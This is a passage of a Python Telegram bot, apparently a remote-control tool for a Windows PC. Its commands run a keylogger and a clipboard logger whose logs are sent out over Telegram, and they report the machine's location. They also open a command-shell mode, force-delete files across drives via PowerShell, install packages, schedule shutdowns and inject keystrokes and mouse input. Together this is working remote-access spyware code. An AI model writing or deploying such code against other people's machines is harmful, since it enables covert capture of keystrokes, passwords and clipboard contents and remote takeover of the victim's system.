                if process_name not in apps:
                    apps[process_name] = []
                apps[process_name].append(process_pid)

            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue

        if not apps:
            await update.message.reply_text("📭 No visible running apps found.")
        else:
            # Prepare response text
            response = "🖥️ Running Applications:\n\n"
            for process_name, pids in apps.items():
                # Show only one entry per app, displaying all associated PIDs
                response += f"{process_name} - PIDs: {', '.join(map(str, pids))}\n"

            # Send long message in chunks if it's too long
            await send_long_message(update, response)

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


async def send_long_message(update, text: str):
    # Split text into chunks of 4096 characters
    chunk_size = 4096
    for i in range(0, len(text), chunk_size):
        await update.message.reply_text(text[i:i + chunk_size])
app.add_handler(CommandHandler("runningapps", restricted_handler(log_command(handle_running_apps))))
#--END--


   




clipboard_monitoring = False
clipboard_thread = None
last_clipboard_content = ""

def clipboard_monitor():
    global clipboard_monitoring, last_clipboard_content
    while clipboard_monitoring:
        try:
            content = pyperclip.paste()
            if content and content != last_clipboard_content:
                last_clipboard_content = content
                timestamp = time.strftime("%a %b %d %I:%M:%S %p %Y")
                with open("clipboard_log.txt", "a", encoding="utf-8") as f:
                    f.write(f"{timestamp}:\n{content}\n\n")
                logging.info("New clipboard content logged.")
            time.sleep(1)
        except Exception as e:
            logging.error(f"Clipboard error: {e}")
            time.sleep(1)

async def handle_start_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global clipboard_monitoring, clipboard_thread
    if clipboard_monitoring:
        await update.message.reply_text("⚠️ Clipboard monitoring is already running.")
        logging.warning("Attempted to start clipboard monitoring, but it's already running.")
        return
    clipboard_monitoring = True
    clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True)
    clipboard_thread.start()
    await update.message.reply_text("✅ Clipboard monitoring started in background.")
    logging.info("Clipboard monitoring started.")

async def handle_stop_clipboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global clipboard_monitoring
    if clipboard_monitoring:
        clipboard_monitoring = False
        await update.message.reply_text("🛑 Clipboard monitoring stopped.")
        logging.info("Clipboard monitoring stopped.")
    else:
        await update.message.reply_text("⚠️ Clipboard monitoring is not active.")
        logging.warning("Attempted to stop clipboard monitoring, but it was not active.")

async def handle_get_clipboard_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.path.exists("clipboard_log.txt"):
            with open("clipboard_log.txt", "rb") as f:
                await update.message.reply_document(f, filename="clipboard_log.txt")
            logging.info("Clipboard log file sent to user.")
        else:
            await update.message.reply_text("📭 Clipboard log file not found.")
            logging.warning("User requested clipboard log, but file was not found.")
    except Exception as e:
        logging.error(f"Error sending clipboard log: {e}")
        await update.message.reply_text(f"❌ Error sending clipboard log: {e}")

async def handle_delete_clipboard_log(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if os.path.exists("clipboard_log.txt"):
            os.remove("clipboard_log.txt")
            await update.message.reply_text("✅ Clipboard log file deleted.")
            logging.info("Clipboard log file deleted.")
        else:
            await update.message.reply_text("📭 Clipboard log file does not exist.")
            logging.warning("User tried to delete clipboard log, but file did not exist.")
    except Exception as e:
        logging.error(f"Error deleting clipboard log: {e}")
        await update.message.reply_text(f"❌ Error deleting clipboard log: {e}")








#--SPECK--
def speak_text(text: str, repeat: int = 1, volume: int | None = None):
    try:
        engine = pyttsx3.init()

        if volume is not None:
            volume_level = max(0.0, min(volume / 100.0, 1.0))
            engine.setProperty('volume', volume_level)

        for _ in range(repeat):
            engine.say(text)
            engine.runAndWait()  # 🔥 now wait after each say()

    except Exception as e:
        logging.error(f"Speech error: {e}")


async def handle_speck(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        message = update.message.text.strip()
        args = message.split(maxsplit=1)

        if len(args) < 2:
            await update.message.reply_text(
                "⚠️ Usage: /speck <text> [repeat] [volume]\nExample: `/speck Hello Jarvis 3 80`",
                parse_mode='Markdown'
            )
            return

        raw_input = args[1].split()
        volume = None
        repeat = 1

        # Try parsing from the end
        if len(raw_input) >= 2 and raw_input[-1].isdigit() and raw_input[-2].isdigit():
            volume = int(raw_input.pop())
            repeat = int(raw_input.pop())
        elif len(raw_input) >= 1 and raw_input[-1].isdigit():
            repeat = int(raw_input.pop())

        text = " ".join(raw_input)

        if volume is not None and not (1 <= volume <= 100):
            await update.message.reply_text("❌ Volume must be between 1 and 100.")
            return

        await update.message.reply_text(
            f"🗣 Speaking: `{text}`\n🔁 Times: {repeat}\n🔊 Volume: {volume if volume else 'Default'}",
            parse_mode='Markdown'
        )

        await asyncio.to_thread(speak_text, text, repeat, volume)

    except Exception as e:
        await update.message.reply_text(f"❌ Error in /speck: {e}")
#--END--



















async def kill_process(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /killprocess <process_name>")
        return

    process_name = context.args[0].lower()  # Get process name from user input

    try:
        # List all running processes
        killed_pids = []
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'].lower() == process_name:  # Match process name (case insensitive)
                try:
                    proc.terminate()  # Try to gracefully terminate the process
                    proc.wait(timeout=3)  # Wait for process termination
                    killed_pids.append(proc.info['pid'])
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
                except psutil.TimeoutExpired:
                    continue

        if killed_pids:
            await update.message.reply_text(f"✅ The following {process_name} processes were terminated successfully: \n" +
                                          '\n'.join([f"PID: {pid}" for pid in killed_pids]))
        else:
            await update.message.reply_text(f"❌ No processes found for {process_name}.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")


















async def handle_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if not context.args:
            await update.message.reply_text("❌ Usage: /shutdown <minutes or seconds>\nExample: /shutdown 1.5")
            return

        value = float(context.args[0])
        seconds = int(value * 60)

        os.system(f"shutdown /s /t {seconds}")
        await update.message.reply_text(f"🛑 Shutdown scheduled in {seconds} seconds.\nUse /cancelshutdown to abort.")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")
async def handle_cancel_shutdown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        os.system("shutdown /a")
        await update.message.reply_text("❎ Shutdown cancelled successfully.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")






# Command to install a package
async def install_package_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) == 0:
            await update.message.reply_text("⚠️ Usage: /install <package_name>")
            return

        package = " ".join(context.args)

        # Clear the pip cache to ensure fresh install
        subprocess.run([sys.executable, "-m", "pip", "cache", "purge"], capture_output=True, text=True)

        # Install the package
        process = subprocess.run(
            [sys.executable, "-m", "pip", "install", package],
            capture_output=True, text=True
        )

        # Check if the package was successfully installed or already exists
        if "Requirement already satisfied" in process.stdout:
            await update.message.reply_text(f"✅ `{package}` is already installed!")
        elif process.returncode == 0:
            await update.message.reply_text(f"✅ Installed `{package}` successfully!")
        else:
            await update.message.reply_text(f"❌ Error:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while installing the package:\n{e}")


# Command to uninstall a package
async def uninstall_package_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) == 0:
            await update.message.reply_text("⚠️ Usage: /uninstall <package_name>")
            return

        package = " ".join(context.args)

        # Uninstall the package
        process = subprocess.run(
            [sys.executable, "-m", "pip", "uninstall", "-y", package],
            capture_output=True, text=True
        )

        # Check if the package was successfully uninstalled
        if "Successfully uninstalled" in process.stdout:
            await update.message.reply_text(f"✅ Uninstalled `{package}` successfully!")
        elif "not installed" in process.stdout:
            await update.message.reply_text(f"❌ `{package}` is not installed!")
        else:
            await update.message.reply_text(f"❌ Error:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while uninstalling the package:\n{e}")

async def modules_list_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        # Run pip list to get installed modules
        process = subprocess.run(
            [sys.executable, "-m", "pip", "list"],
            capture_output=True, text=True
        )

        if process.returncode == 0:
            installed_modules = process.stdout
            await update.message.reply_text(f"📦 Installed Modules:\n```\n{installed_modules}\n```", parse_mode='Markdown')
        else:
            await update.message.reply_text(f"❌ Error fetching the list of installed modules:\n{process.stderr}")
    except Exception as e:
        await update.message.reply_text(f"❌ Exception occurred while fetching installed modules:\n{e}")



#--KEYLOGGER-
def on_press(key):
    with open("keys_log.txt", "a", encoding="utf-8") as f:
        try:
            f.write(key.char)
        except AttributeError:
            f.write(f" [{key.name.upper()}] ")
async def start_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylog_listener, keylog_active
    if keylog_active:
        await update.message.reply_text("🟡 Keylogger already running.")
        return
    keylog_listener = keyboard.Listener(on_press=on_press)
    keylog_listener.start()
    keylog_active = True
    await update.message.reply_text("🔴 Keylogger started.")
async def stop_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global keylog_listener, keylog_active
    if keylog_listener:
        keylog_listener.stop()
        keylog_listener = None
        keylog_active = False
        await update.message.reply_text("🟢 Keylogger stopped.")
    else:
        await update.message.reply_text("⚪ Keylogger was not running.")
async def send_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists("keys_log.txt"):
        await update.message.reply_document(document=open("keys_log.txt", "rb"))
    else:
        await update.message.reply_text("📁 No keylog file found.")
async def delete_keylog(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        log_file = "keys_log.txt"
        if os.path.exists(log_file):
            os.remove(log_file)
            await update.message.reply_text("🗑️ Keylogger log deleted successfully.")
        else:
            await update.message.reply_text("📂 No keylog file found to delete.")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to delete log file: {e}")
#--END--







#--TIME--
async def handle_time_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        now = datetime.now()
        time_str = f"Time: {now.strftime('%I:%M %p')}\nDate: {now.strftime('%d-%m-%Y')}"
        await update.message.reply_text(time_str)
    except Exception as e:
        await update.message.reply_text(f"Failed to fetch time: {e}")
#--END--








async def handle_open_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /web <search text or URL>")
        return

    query = " ".join(context.args).strip()
    
    # If user enters valid http/https URL, open as-is, else treat it as search
    if query.startswith("http://") or query.startswith("https://"):
        url = query
    else:
        # Encode query and prepare Google search URL
        search_query = urllib.parse.quote_plus(query)
        url = f"https://www.google.com/search?q={search_query}"

    try:
        webbrowser.open(url)
        await update.message.reply_text(f"✅ Opened: {query}")
    except Exception as e:
        await update.message.reply_text(f"❌ Failed to open web search: {e}")



async def handle_close_web(update: Update, context: ContextTypes.DEFAULT_TYPE):
    browser_names = ["chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"]  # Customize as needed
    closed = []

    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] and proc.info['name'].lower() in browser_names:
                proc.kill()
                closed.append(proc.info['name'])
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue

    if closed:
        await update.message.reply_text(f"✅ Closed: {', '.join(set(closed))}")
    else:
        await update.message.reply_text("⚠️ No supported browser processes were found running.")








alerts_active = False
alert_thread = None
alert_log_file = "alert_log.txt"

# Sets to track previously seen devices
seen_usb = set()
seen_bluetooth = set()
seen_network = set()
seen_audio = set()

# Function to log events to the alert log file
def log_event(message):
    # Check if the log file exists, if not, create it
    if not os.path.exists(alert_log_file):
        with open(alert_log_file, "w", encoding="utf-8") as f:
            f.write("Alert Log Initialized.\n")  # Optional message when file is created

    with open(alert_log_file, "a", encoding="utf-8") as f:
        timestamp = time.strftime('%Y-%m-%d %I:%M:%S %p')
        f.write(f"{timestamp} - {message}\n")

def monitor_usb_devices(c):
    global seen_usb
    try:
        current_usb = set()
        usb_devices = c.query("SELECT * FROM Win32_USBHub")
        for device in usb_devices:
            name = device.Name
            if name not in seen_usb:
                log_event(f"USB Device Connected: {name}")
            current_usb.add(name)
        seen_usb = current_usb
    except Exception as e:
        log_event(f"Error monitoring USB: {e}")

def monitor_bluetooth_connections(c):
    global seen_bluetooth
    try:
        current_bt = set()
        devices = c.query("SELECT * FROM Win32_PnPEntity")
        for device in devices:
            if device.Description and "Bluetooth" in device.Description:
                desc = device.Description
                if desc not in seen_bluetooth:
                    log_event(f"Bluetooth Device: {desc}")
                current_bt.add(desc)
        seen_bluetooth = current_bt
    except Exception as e:
        log_event(f"Error monitoring Bluetooth: {e}")

def monitor_network_adapters(c):
    global seen_network
    try:
        current_net = set()
        adapters = c.query("SELECT * FROM Win32_NetworkAdapter WHERE NetConnectionStatus=2")
        for adapter in adapters:
            name = adapter.Name
            lname = name.lower()
            label = ""
            if "wi-fi" in lname or "wireless" in lname:
                label = f"Wi-Fi Connected: {name}"
            elif "ethernet" in lname:
                label = f"Ethernet Connected: {name}"
            if label and label not in seen_network:
                log_event(label)
            if label:
                current_net.add(label)
        seen_network = current_net
    except Exception as e:
        log_event(f"Error monitoring network: {e}")

def monitor_audio_devices(c):
    global seen_audio
    try:
        current_audio = set()
        devices = c.query("SELECT * FROM Win32_SoundDevice")
        for device in devices:
            name = device.Name
            if name not in seen_audio:
                log_event(f"Audio Device Active: {name}")
            current_audio.add(name)
        seen_audio = current_audio
    except Exception as e:
        log_event(f"Error monitoring audio: {e}")

def start_monitoring_alerts():
    global alerts_active
    pythoncom.CoInitialize()
    c = wmi.WMI()
    while alerts_active:
        monitor_usb_devices(c)
        monitor_bluetooth_connections(c)
        monitor_network_adapters(c)
        monitor_audio_devices(c)
        time.sleep(10)
    pythoncom.CoUninitialize()

async def start_smart_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alerts_active, alert_thread
    if alerts_active:
        await update.message.reply_text("⚠️ Smart Alerts are already running.")
        return
    # Check if the alert log file exists and create it if not
    if not os.path.exists(alert_log_file):
        log_event("Alert Log Initialized.")

    alerts_active = True
    alert_thread = threading.Thread(target=start_monitoring_alerts, daemon=True)
    alert_thread.start()
    await update.message.reply_text("✅ Smart Alerts started.")

async def stop_smart_alerts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global alerts_active
    if not alerts_active:
        await update.message.reply_text("⚠️ Smart Alerts are not running.")
        return
    alerts_active = False
    await update.message.reply_text("🛑 Smart Alerts stopped.")

async def get_alert_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(alert_log_file):
        with open(alert_log_file, "rb") as f:
            await update.message.reply_document(f, filename=alert_log_file)
    else:
        await update.message.reply_text("❌ No alert log file found.")

async def delete_alert_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if os.path.exists(alert_log_file):
        os.remove(alert_log_file)
        await update.message.reply_text("✅ Alert log file has been deleted.")
    else:
        await update.message.reply_text("❌ No alert log file found to delete.")











def get_location():
    try:
        # Using ipinfo.io to get location
        res = requests.get("https://ipinfo.io")
        if res.status_code == 200:  # Check if the request was successful
            data = res.json()

            # Extracting coordinates
            location = data['loc'].split(',')
            latitude = location[0]
            longitude = location[1]

            logging.info(f"Retrieved coordinates: Latitude: {latitude}, Longitude: {longitude}")
            return latitude, longitude
        else:
            logging.error(f"Error getting location: Received status code {res.status_code}")
            return None, None
    except Exception as e:
        logging.error(f"Error getting location: {e}")
        return None, None

# Async function to send location to Telegram
async def send_location_telegram(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📍 Getting your current location...")

    # Blocking call to get location (still uses requests)
    location = get_location()

    # If location is successfully retrieved, send it to Telegram
    if location:
        latitude, longitude = location
        await update.message.reply_location(latitude=latitude, longitude=longitude)
        await update.message.reply_text(f"✅ Location sent to Telegram!\nLatitude: {latitude}\nLongitude: {longitude}")
    else:
        await update.message.reply_text("❌ Could not retrieve location.")

# Command handler to trigger location fetching
async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await send_location_telegram(update, context)









#----------------CREATENOTECODE------------------
def save_note_to_file(content, file_name):
    try:
        with open(file_name, "a", encoding="utf-8") as file:
            file.write(content + "\n")
        logging.info(f"Note saved to file: {file_name}")
    except Exception as e:
        logging.error(f"Error saving note: {e}")

async def start_note_creation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.setdefault("state", {
        "cmd_mode": False,
        "process": None,
        "note_state": None,
        "file_name": None
    })

    state["note_state"] = "awaiting_filename"
    await update.message.reply_text("📝 Please send the *file name* (without `/`).", parse_mode="Markdown")
    logging.info(f"User {update.effective_user.id} started note creation, awaiting filename.")

async def handle_all_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    state = context.user_data.setdefault("state", {
        "cmd_mode": False,
        "process": None,
        "note_state": None,
        "file_name": None
    })

    # CMD mode handling
    if state["cmd_mode"]:
        if text.lower() in ["/exitcmd", "exit", "stop cmd"]:
            proc = state["process"]
            if proc:
                proc.kill()
                await proc.wait()
                logging.info(f"User {update.effective_user.id} exited CMD mode and killed process.")
            state["cmd_mode"] = False
            state["process"] = None
            return await update.message.reply_text("🚪 Exited CMD mode.")
        else:
            output = await execute_cmd_command(text, state["process"])
            return await update.message.reply_text(f"📤 Output:\n{output}")

    # Note flow: filename input
    if state["note_state"] == "awaiting_filename":
        filename = text if text.endswith(".txt") else text + ".txt"
        state["file_name"] = filename
        state["note_state"] = "awaiting_content"
        logging.info(f"User {update.effective_user.id} set note filename to {filename}")
        return await update.message.reply_text(
            f"✅ File name set as *{filename}*.\nNow send the *note content*.",
            parse_mode="Markdown"
        )

    # Note flow: note content input
    if state["note_state"] == "awaiting_content":
        save_note_to_file(text, state["file_name"])
        note_file = state["file_name"]
        state["note_state"] = None
        state["file_name"] = None
        logging.info(f"User {update.effective_user.id} saved a note to {note_file}")
        return await update.message.reply_text(
            f"✅ Your note has been saved to *{note_file}*.",
            parse_mode="Markdown"
        )

    # Fallback
    await update.message.reply_text("❓ Unknown command or message. Use /opencmd or /createnote.")
    logging.warning(f"User {update.effective_user.id} sent unknown command or message: {text}")













# Function to check if any process is using the file or folder
def is_file_or_folder_in_use(path):
    for proc in psutil.process_iter(['pid', 'name', 'open_files']):
        try:
            for file in proc.info['open_files'] or []:
                if file.path == path:
                    return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            continue
    return False

# Function to delete the file/folder using PowerShell if normal deletion fails
def delete_using_powershell(path):
    try:
        subprocess.run(["powershell", "-Command", f"Remove-Item -Path '{path}' -Recurse -Force"], check=True)
        return True
    except subprocess.CalledProcessError:
        return False

# Function to search for a file by name across all available drives
def search_file_by_name(file_name):
    drives = ['C:/', 'D:/', 'E:/', 'F:/']  # Specify the drives to search (add more if needed)
    
    for drive in drives:
        for root, dirs, files in os.walk(drive):  # Search recursively in each drive
            if file_name in files:
                return os.path.join(root, file_name)
    return None

# /delete command to delete a specific file or folder
async def handle_delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ Usage: /delete <file_name or full_path>")
        return

    # Get the file name or full path
    path_input = context.args[0]

    # If it's a full path, try deleting directly
    if os.path.isabs(path_input):
        path = path_input
    else:
        # If it's just the file name, we will search for it across all drives
        path = search_file_by_name(path_input)

    # If the path is not found, notify the user
    if not path:
        await update.message.reply_text(f"❌ No file/folder found with the name *{path_input}*.")
        return

    # Check if the path is a file or a directory
    if os.path.isdir(path):
        # Handle directory (folder) deletion
        if is_file_or_folder_in_use(path):
            await update.message.reply_text(f"❌ Folder *{path}* is currently in use by another process.")
            return
        try:
            shutil.rmtree(path)  # Delete folder and its contents
            await update.message.reply_text(f"✅ Folder *{path}* has been deleted.", parse_mode="Markdown")
        except Exception as e:
            await update.message.reply_text(f"❌ Error deleting folder: {e}")
    elif os.path.isfile(path):
        # Handle file deletion
        if is_file_or_folder_in_use(path):
            await update.message.reply_text(f"❌ File *{path}* is currently in use by another process.")
            return
        try:
            os.remove(path)  # Delete the file
            await update.message.reply_text(f"✅ File *{path}* has been deleted.", parse_mode="Markdown")
        except PermissionError:
            # If permission error, try deleting using PowerShell
            if delete_using_powershell(path):
                await update.message.reply_text(f"✅ File *{path}* deleted using PowerShell.")
            else:
                await update.message.reply_text(f"❌ Error deleting file: {path}. Permission denied.")
        except Exception as e:
            await update.message.reply_text(f"❌ Error deleting file: {e}")
    else:
        await update.message.reply_text(f"❌ The specified path *{path}* is neither a file nor a folder.")












#--SPEEDTEST--
def run_speedtest():
    """Runs the speed test in a blocking way."""
    st = speedtest.Speedtest()
    st.get_best_server()

    download_speed = st.download() / 1_000_000  # Convert to Mbps
    upload_speed = st.upload() / 1_000_000      # Convert to Mbps
    ping = st.results.ping

    result = f"""📶 *Speed Test Results:*
📥 Download: {download_speed:.2f} Mbps
📤 Upload: {upload_speed:.2f} Mbps
📡 Ping: {ping:.0f} ms"""
    return result

async def handle_speedtest(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handles the speed test command asynchronously."""
    await update.message.reply_text("⏳ Running speed test. Please wait...")

    try:
        # Run the speed test in a separate thread to avoid blocking the event loop
        result = await asyncio.to_thread(run_speedtest)

        # Send the result after the test is complete
        await update.message.reply_text(result, parse_mode="Markdown")

    except Exception as e:
        await update.message.reply_text(f"❌ Failed to run speed test:\n{e}")

app.add_handler(CommandHandler("speedtest", restricted_handler(log_command(handle_speedtest))))
#--END--



#--KEYMOUSE--
keyboard = KeyboardController()

# /keyboard <key>
def press_key(key_str):
    key_str = key_str.lower().strip()
    
    special_keys = {
        "enter": Key.enter,
        "tab": Key.tab,
        "space": Key.space,
        "shift": Key.shift,
        "ctrl": Key.ctrl,
        "alt": Key.alt,
        "esc": Key.esc,
        "backspace": Key.backspace,
        "windows": Key.cmd,
    }

    # Add F1 to F12 support dynamically
    for i in range(1, 13):
        special_keys[f"f{i}"] = getattr(Key, f"f{i}")

    if key_str in special_keys:
        key = special_keys[key_str]
    elif len(key_str) == 1:
        key = key_str
    else:
        return f"❌ Unsupported key: {key_str}"

    keyboard.press(key)
    keyboard.release(key)
    return f"✅ Pressed key: `{key_str}`"

async def handle_keyboard(update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /keyboard <key>")
        return
    result = await asyncio.to_thread(press_key, context.args[0])
    await update.message.reply_text(result, parse_mode="Markdown")


# /combo <key1+key2+key3>
def press_combo(combo):
    keys = combo.lower().split('+')
    key_map = {
        "ctrl": Key.ctrl,
        "alt": Key.alt,
        "shift": Key.shift,
        "enter": Key.enter,
        "tab": Key.tab,
        "esc": Key.esc,
        "del": Key.delete,
        "windows": Key.cmd,
    }
    resolved = [key_map.get(k, k) for k in keys]
    for k in resolved:
        keyboard.press(k)
    for k in reversed(resolved):
        keyboard.release(k)
    return f"✅ Pressed combo: `{combo}`"

async def handle_combo(update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /combo <key1+key2+...>")
        return
    result = await asyncio.to_thread(press_combo, context.args[0])
    await update.message.reply_text(result, parse_mode="Markdown")

# /type <text>
def type_text(text):
    for c in text:
        keyboard.press(c)
        keyboard.release(c)
    return f"✅ Typed: `{text}`"

async def handle_type(update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /type <text>")
        return
    text = " ".join(context.args)
    result = await asyncio.to_thread(type_text, text)
    await update.message.reply_text(result, parse_mode="Markdown")

# /mouseclick <left|right>
def click_mouse(button):
    if button.lower() == "left":
        pyautogui.click(button='left')
    elif button.lower() == "right":
        pyautogui.click(button='right')
    else:
        return "❌ Use `left` or `right`"
    return f"🖱️ {button.capitalize()} click done."

async def handle_mouseclick(update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /mouseclick <left|right>")
        return
    result = await asyncio.to_thread(click_mouse, context.args[0])
    await update.message.reply_text(result, parse_mode="Markdown")

# /mousemove <x> <y>
def move_mouse(x, y):
    pyautogui.moveTo(x, y)
    return f"🖱️ Mouse moved to ({x}, {y})"

async def handle_mousemove(update, context):
    try:
        x, y = int(context.args[0]), int(context.args[1])
        result = await asyncio.to_thread(move_mouse, x, y)
    except:
        result = "⚠️ Usage: /mousemove <x> <y>"
    await update.message.reply_text(result, parse_mode="Markdown")

def scroll_mouse(direction: str, amount: int):
    try:
        if direction.lower() == "up":
            pyautogui.scroll(amount)
        elif direction.lower() == "down":
            pyautogui.scroll(-amount)
        else:
            return "⚠️ Use `up` or `down` for direction."
        return f"🖱️ Scrolled {direction} by {amount} pixels."
    except Exception as e:
        return f"❌ Scroll failed: {e}"

async def handle_scroll(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 2:
        await update.message.reply_text("Usage: /scroll <up|down> <pixels>")
        return
    try:
        direction = context.args[0]
        amount = int(context.args[1])
        result = await asyncio.to_thread(scroll_mouse, direction, amount)
    except ValueError:
        result = "⚠️ Please enter a number for pixels."
    await update.message.reply_text(result)


async def handle_spamkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("⚠️ Usage: /spamkeys <key1 key2 ...> <times> <delay>")
        return

    *keys, times_str, delay_str = context.args

    try:
        times = int(times_str)
        delay = float(delay_str)
    except ValueError:
        await update.message.reply_text("❌ Invalid number of times or delay.")
        return

    key_map = {
        "enter": Key.enter,
        "tab": Key.tab,
        "space": Key.space,
        "shift": Key.shift,
        "ctrl": Key.ctrl,
        "alt": Key.alt,
        "esc": Key.esc,
        "backspace": Key.backspace,
        "windows": Key.cmd,
    }

    await update.message.reply_text(f"🟢 Spamming keys: `{keys}` x{times} with {delay}s delay", parse_mode='Markdown')

    def spam_keys():
        for _ in range(times):
            for k in keys:
                key = key_map.get(k.lower(), k)
                keyboard.press(key)
                keyboard.release(key)
            time.sleep(delay)

    await asyncio.to_thread(spam_keys)

async def handle_spamtext(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 3:
        await update.message.reply_text("⚠️ Usage: /spamtext <text> <times> <delay>")
        return

    *text_parts, times_str, delay_str = context.args
    text = " ".join(text_parts)

    try:
        times = int(times_str)
        delay = float(delay_str)
    except ValueError:
        await update.message.reply_text("❌ Invalid number of times or delay.")
        return

    await update.message.reply_text(f"🟢 Spamming text `{text}` x{times} with {delay}s delay", parse_mode='Markdown')

    def spam_text():
        for _ in range(times):
            for c in text:
                keyboard.press(c)
                keyboard.release(c)
            keyboard.press(Key.enter)     # Press Enter after the message
            keyboard.release(Key.enter)
            time.sleep(delay)

    await asyncio.to_thread(spam_text)


pytesseract.pytesseract.tesseract_cmd = r"C:\Program Files\Tesseract-OCR\tesseract.exe"

def preprocess_image(image):
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    return thresh

def find_text_on_screen(target_text, partial_match=True, min_confidence=60):
    try:
        try:
            _ = pytesseract.get_tesseract_version()
        except TesseractNotFoundError:
            return (f"❌ Tesseract OCR not found at `{pytesseract.pytesseract.tesseract_cmd}`. "
                    "Please install Tesseract or fix the path.")

        screenshot = ImageGrab.grab()
        screenshot_cv = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
        processed_img = preprocess_image(screenshot_cv)

        custom_config = r'--oem 3 --psm 6'
        data = pytesseract.image_to_data(processed_img, output_type=pytesseract.Output.DICT, config=custom_config)

        found_positions = []

        for i, text in enumerate(data['text']):
            try:
                conf = int(data['conf'][i])
            except ValueError:
                conf = 0

            if conf < min_confidence or not text.strip():
                continue

            text_lower = text.strip().lower()
            target_lower = target_text.strip().lower()

            match = False
            if partial_match and target_lower in text_lower:
                match = True
            elif not partial_match and text_lower == target_lower:
                match = True

            if match:
                x, y, w, h = data['left'][i], data['top'][i], data['width'][i], data['height'][i]
                center_x = x + w // 2
                center_y = y + h // 2
                found_positions.append((center_x, center_y))

        if found_positions:
            return f"✅ Found text `{target_text}` at positions: {found_positions}"
        else:
            return f"❌ Text `{target_text}` not found on screen."

    except Exception as e:
        import logging
        logging.exception("Error in find_text_on_screen")
        return f"❌ Error in find_text_on_screen: {e}"
async def handle_find(update, context):
    if not context.args:
        await update.message.reply_text("⚠️ Usage: /find <text on screen>")
        return
    text_to_find = " ".join(context.args)
    result = await asyncio.to_thread(find_text_on_screen, text_to_find)
    escaped_result = escape_markdown(result, version=2)
    await update.message.reply_text(escaped_result, parse_mode="MarkdownV2")

app.add_handler(CommandHandler("findtext", restricted_handler(log_command(handle_find))))
app.add_handler(CommandHandler("spamkeys", restricted_handler(log_command(handle_spamkeys))))
app.add_handler(CommandHandler("spamtext", restricted_handler(log_command(handle_spamtext))))
app.add_handler(CommandHandler("keyboard", restricted_handler(log_command(handle_keyboard))))
app.add_handler(CommandHandler("combo", restricted_handler(log_command(handle_combo))))
app.add_handler(CommandHandler("type", restricted_handler(log_command(handle_type))))
app.add_handler(CommandHandler("mouseclick", restricted_handler(log_command(handle_mouseclick))))
app.add_handler(CommandHandler("mousemove", restricted_handler(log_command(handle_mousemove))))
app.add_handler(CommandHandler("scroll", restricted_handler(log_command(handle_scroll))))
#--END--


#--VOLUME--
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from comtypes import CoInitialize

def get_current_volume() -> int:
    CoInitialize()  # Ensure COM is initialized in the thread
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    current = volume.GetMasterVolumeLevelScalar()
    return int(current * 100)

def set_volume(level: int) -> str:
    CoInitialize()  # Same here
    if not (0 <= level <= 100):
        return "❌ Volume must be between 0 and 100."
    devices = AudioUtilities.GetSpeakers()
